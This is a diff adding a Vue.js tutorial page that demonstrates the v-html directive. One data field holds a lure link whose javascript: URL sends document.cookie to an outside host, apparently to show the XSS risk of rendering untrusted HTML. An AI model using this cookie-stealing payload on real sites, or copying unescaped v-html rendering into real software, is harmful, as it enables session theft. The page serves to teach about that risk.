@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>v-html指令</title>
+    <script src="../../js/vue.js"></script>
+  </head>
+  <body>
+    <!-- 小结： -->
+    <div class="root">
+      <div>{{name}}</div>
+      <div v-text="name"></div>
+      <div v-html="msg"></div>
+      <div v-html="str"></div>
+    </div>
+    <script>
+      const vm = new Vue({
+        el: ".root",
+        data: {
+          name: "hhhh",
+          msg: "<h1>hello world!</h1>",
+          str: '<a href=javascript:location.href="https://www.baidu.com/?"+document.cookie> 找到资源了，快来！</a>',
+        },
+      });
+    </script>
+  </body>
+</html>
